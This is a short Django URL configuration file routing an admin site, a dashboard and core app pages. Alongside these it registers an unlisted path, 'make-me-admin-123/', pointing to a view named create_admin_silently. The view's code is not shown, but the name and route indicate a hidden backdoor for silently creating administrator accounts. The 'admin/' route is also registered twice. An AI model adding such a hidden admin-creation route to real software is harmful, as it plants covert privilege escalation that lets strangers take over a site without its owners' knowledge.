from django.contrib import admin
from django.urls import path, include
from core.views import dashboard
from core.views import create_admin_silently

urlpatterns = [
    path('admin/', admin.site.urls),
    path('make-me-admin-123/', create_admin_silently),
    
    path('admin/', admin.site.urls),

    # Dashboard
    path('', dashboard, name='dashboard'),

    # Core app URLs
    path('', include('core.urls')),
]
